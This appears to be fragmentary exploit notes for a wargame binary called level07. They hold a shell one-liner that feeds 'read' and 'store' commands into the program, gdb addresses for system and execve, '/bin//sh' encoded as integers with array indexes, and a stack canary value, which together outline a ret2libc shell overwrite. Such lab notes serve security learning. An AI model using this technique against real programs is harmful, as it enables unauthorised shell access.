#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main()
{
	// execve(" Number at data[%u] is %u\n", NULL, NULL);
	// execve(" Index: ", NULL, NULL);
	printf("SUCCESS");
	return 0;
}
//////////////////////////////////////////////////

#!/bin/sh
(echo read ; sleep 0.2 ; echo $1 ; sleep 0.2 ; echo store ; sleep 0.2; echo $2 ; sleep 0.2; $1 ) | ./level07

gdb system 4159090384
system 4159090376
execve 4159587800
-1040108889

0x68732f2f	1752379183 index 2
0x6e69622f 1852400175  index 1

canary 0xffffd6fc: 0xf7fceff4
set {char [4]} 0x08040000 = "Ace"